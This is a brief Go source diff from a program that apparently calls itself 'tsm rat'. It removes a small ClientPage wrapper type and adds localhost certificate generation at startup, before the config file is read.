@@ -34,16 +34,13 @@ func addDownload(tf TempFile) string {
 	return tempKey
 }
 
-type ClientPage struct {
-	*Client
-}
-
-func NewSingle(client *Client) ClientPage {
-	return ClientPage{client}
-}
-
 func main() {
 	fmt.Println("tsm rat", common.Version)
+
+	if CertExists() {
+		fmt.Println("generating certificate...")
+		GenerateCertificate("localhost")
+	}
 
 	data, err := ioutil.ReadFile(ConfigFile)
 
